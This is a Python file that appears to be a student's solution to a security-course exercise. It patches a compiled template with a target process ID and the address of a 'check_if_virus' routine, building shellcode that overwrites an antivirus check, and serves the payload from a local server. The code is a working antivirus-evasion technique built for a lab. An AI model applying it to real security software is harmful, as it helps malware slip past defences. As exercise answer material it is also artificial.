import addresses
import evasion
import struct

from infosec.core import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        template_file = open(PATH_TO_TEMPLATE, "rb") # open to read in binary mode
        template = template_file.read()
        template_file.close()

        pid_loc = template.find(struct.pack("<I", 0x01234567))
        func_loc = template.find(struct.pack("<I", 0x01230123))
        
        func_addr = addresses.CHECK_IF_VIRUS_CODE
        

        shellcode = template[:pid_loc] + struct.pack("<I", pid) + template[pid_loc+4:func_loc] + struct.pack("<I", func_addr) + template[func_loc+4:]

        return shellcode

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
